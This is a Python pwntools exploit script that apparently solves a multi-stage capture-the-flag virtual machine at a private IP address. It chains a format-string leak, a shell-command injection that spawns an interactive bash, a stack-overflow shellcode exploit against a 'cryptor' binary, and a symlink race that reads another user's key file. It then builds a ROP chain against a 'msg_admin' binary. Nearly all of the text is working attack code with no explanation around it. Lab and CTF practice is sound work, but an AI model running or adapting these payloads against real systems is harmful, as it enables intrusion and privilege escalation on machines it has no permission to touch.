from pwn import *
import string
import random


r = remote('192.168.224.154', 1337)
# Leak stack
# print r.recv()
r.clean()

###
# Get access code
###
r.sendline('%d.' * 3 + 'A' * 80)
r.recvuntil("ACCESS CODE: ")
output = r.recv()
code = output.split('.')[2]

log.info("Code identified: {}".format(code))

r.sendline(code)


###
#  Turn on reporting
###

r.sendline('3')
shellcode = '%x.' * 70
r.clean()
r.sendline(shellcode)
r.recvuntil("SESSION: ")
# r.recvuntil("SESSION: ")
"""
['bfba64ac', '104', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', 'ff0a2e78', 'b778bc20', 'bfba65fc', '0', 'b778b000', 'b778bac0', 'b778c898', 'b75df940', 'b76510b5', 'b778bac0', '59', '4e', '59', 'b778b8a0', 'b778b000', 'b778bac0', '\n']
"""

session_name = r.recvuntil('\n').split('.')
# print session_name

n_index = session_name.index('4e')
log.info("Report 'N' at offset {}".format(n_index))

r.sendline('3')
r.sendline('Y' * (4*(n_index-2) + 1) )


###
# After reporting
###

for command in ['uname -a', 'whoami', 'id']:
    r.clean()
    r.sendline('1')
    r.sendline('$({} >&2)'.format(command))

    r.recvuntil("SENDING TO REPORT MODULE")
    output = r.recvuntil('[+]').split('\n')[2]
    log.success("{} - {}".format(command, output))

r.clean()
r.sendline('1')
r.sendline('$(/bin/bash -i >&2)')

log.success("Shell received: anansi")
sleep(1)

offset = cyclic_find('zaab')
shellcode = 'A' * cyclic_find('zaab') + p32(0x804a080)
buffer = 116 - len(shellcode)

binsh_shellcode = asm(shellcraft.sh())

# Build argv1
argv1 = '"A" * {} + "{}" + "C" * {}'.format(offset, r'\x80\xa0\x04\x08', buffer)

# Build argv2
argv2 = ''.join('\\x{}'.format(enhex(binsh_shellcode)[x:x+2]) for x in xrange(0, len(enhex(binsh_shellcode)), 2))

# Final command
actual_shellcode = """./cryptor $(python -c 'print {}') $(python -c 'print "{}"')""".format(argv1, argv2)

log.info(actual_shellcode)

# Sometimes the command didn't work. This will repeat throwing the command until we get a reynard shell.
r.sendline('cd /home/reynard/private')
while True:
    r.clean()
    r.sendline(actual_shellcode)
    r.clean()
    r.sendline('id')
    output = r.recv()
    if 'reynard' in output:
        break

log.success("Shell received: reynard")
sleep(1)

r.sendline('id')

r.sendline(""" echo "
import os
import socket
import telnetlib
import subprocess

HOST = 'localhost'
PORT = 7075

try:
    os.remove('/mnt/usb/key.txt')
except:
    pass

# Ensure we have a file to begin with
subprocess.check_output(['touch', '/mnt/usb/key.txt'])

# Connect and check for symlink
r = socket.socket()
r.connect((HOST, PORT))

# Quickly remove the non-symlinked file and re-symlink
os.remove('/mnt/usb/key.txt')
os.symlink('/home/puck/key.txt', '/mnt/usb/key.txt')

# Try for our shellz
t = telnetlib.Telnet()
t.sock = r
t.interact()

r.close()
" > win.py
""")

r.sendline("python win.py")
r.clean()
r.sendline("whoami")
output = r.recv()
log.success("Shell received: {}".format(output))
sleep(1)

elf = ELF('msg_admin')
rop = ROP(elf)

pivot = rop.search(move=20).address # Need to move the stack 16 bytes
strtok = elf.got['strtok']

log.info("Pivot: {}".format(hex(pivot)))
log.info("Strtok: {}".format(hex(strtok)))

rop.puts(strtok)
rop.puts(strtok)
rop.puts(strtok)
rop.puts(strtok)

print rop.dump()

sc = str(rop)
sc += 'A' * (cyclic_find('daac')-len(sc)) + p32(strtok)
sc += 'B' * (216 - len(sc))

shellcode_file =  '{}|{}\n'.format('a'*4, sc)
shellcode_file += '{}|{}\n'.format(p32(pivot), 'B'*20)
shellcode_file += '{}|{}\n'.format('c'*4, 'C'*20)

with open('pwn.msg', 'w') as f:
    f.write(shellcode_file)

r.sendline('echo "{}" > /home/puck/pwn.msg'.format(shellcode_file))

r.sendline('cd /home/puck')

r.interactive()

